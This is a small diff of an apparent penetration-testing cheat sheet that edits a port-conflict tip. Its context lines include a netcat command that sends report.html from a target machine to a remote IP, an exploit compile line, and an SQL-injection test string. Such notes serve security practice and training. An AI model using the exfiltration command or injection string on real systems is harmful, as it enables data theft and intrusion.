@@ -190,7 +190,7 @@ Command on target: `nc.exe 192.168.xxx.xxx 443 -w 3 < report.html`<br/>
 Exploit mostly written in c.<br/>
 `gcc -o exploit EXPLOIT.c `<br/>
 # Solutions
-Python server can't be started because port is in use (Address is already in use): `lsof -i:80` and kill corresponding app.<br/>
+Python server can't be started because port is in use (Address is already in use): `lsof -i:80` kill corresponding app.<br/>
 Testing-string for sql-injection: `'">*)asdf-${{<%[%'"}}%\` <br/>
 Problem with python-packages:<br/>
 Commands from terminal not working ("-rbash: cd: restricted" or similar)<br/>
